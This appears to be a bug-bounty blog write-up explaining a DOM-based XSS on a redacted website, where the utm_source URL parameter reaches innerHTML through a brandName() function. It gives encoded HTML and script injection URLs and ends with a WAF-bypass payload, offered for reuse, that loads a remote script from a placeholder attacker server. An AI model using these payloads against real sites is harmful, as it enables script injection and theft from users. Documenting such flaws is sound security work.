# ||||||||||||||||||||||||||||||||||||||||||||||||||


![](https://miro.medium.com/v2/resize:fit:630/1*A5ZgiZJHJWP5k5OFzW_C0A.png)

Figure 1

The vulnerability stems from the mishandling of user inputs retrieved from the URL parameters. The application fetches two parameters, **utm_source,** and **utm_campaign**, using the `window.location.search` function. The parameters are then passed to a `getUrlParamter()`function.

![](https://miro.medium.com/v2/resize:fit:700/1*8l5Guyed_FX9hlPxqCEMtQ.png)

Figure 2

This function aims to extract the value of a specific parameter (in this case, `'utm_source'` or `'utm_campaign'`)from a URL query string and decode it, before returning it, for example, if the URL is something like this [_https://exapmle.com/redact?utm_source=hello_](https://exapmle.com/redact?utm_source=hello&utm_campaign=bye) The below code from Figure 1 will be executed.

> queryString = window.location.search,utm_source = getUrlParameter(‘utm_source’, queryString),

The `getUrlParamter('utm_source', queryString)` function will return the value of the `utm_source` parameter **hello** and will store it in the `utm_source` varaible, same is for the `utm_campaign` parameter.

![](https://miro.medium.com/v2/resize:fit:700/1*jAeudJg6HWSHajhdFvBJqA.png)

Figure 3

In Figure 3, if the `utm_campaign` parameter value is set to “closedDomains”, the application executes a switch case statement based on the value of utm_source. If no matching case is found, the application calls the `brandName()` function with the value of utm_source as a parameter.

![](https://miro.medium.com/v2/resize:fit:675/1*R1kjHm2rEpOr0GpYJ_gh2w.png)

Figure 4

In Figure 4, the `brandName` function is designed to either hide elements with the class `.js-brandname-container` or set the inner HTML of elements with the class `.js-brandname` based on the value of the `brandName` function parameter. If the `brandName` value is set to `false`, it hides the specified elements; otherwise, it sets their inner HTML to the provided value of the `brandName`

As we already know from Figure 3 that we can control the value of the parameter passed to the the function`brandName(utm_source)` with URL parameter `utm_source` , we can now inject HTML tags and potentially execute arbitrary JavaScript code.

Now assesmbling the pieces for the final payload.

> [https://exapmle.com/redact?utm_source=%3ch1%3eHTML_Injection%3c%2fh1%3e&utm_campaign=closedDomains](https://exapmle.com/redact?utm_source=%3Ch1%3EHTML_Injection%3C%2Fh1%3E&utm_campaign=closedDomains)

![](https://miro.medium.com/v2/resize:fit:700/1*HZe-kYQ1kCeVZtQt8sMZXQ.png)

Figure 5

Great, HTML tag created sucessfully, now let’s try for XSS.

> [https://exapmle.com/redact?utm_source=%3cscript%3ealert(1)%3c%2fscript%3e&utm_campaign=closedDomains](https://exapmle.com/redact?utm_source=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&utm_campaign=closedDomains)

![](https://miro.medium.com/v2/resize:fit:700/1*mV_x79IZFIW7FMo99D4plQ.png)

Figure 6

Akamai Firewall came to the rescue, now despite the potential presence of the (WAF), I managed to successfully bypass it to execute the XSS attack, feel free to use this payload.

`> <button style=”color:red” popovertarget=”x” value=”Click me”>Click Me</button><hvita onbeforetoggle=with(document){xx=createElement(‘script’);xx.setAttribute(‘src’,’https://your-server/x.js');body.appendChild(xx)} popover id=x>Hvita</hvita>

Replace the [https://your-server/x.js](https://your-server/x.js) with your own server where you have uploaded the JavaScript file which will execute your payload.

Click on the **Click Me** Button, and there you go.

![](https://miro.medium.com/v2/resize:fit:700/1*MqLdLN6s1LtjrMs4Burt0g.png)

Figure 7

Thank you for Reading.
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||



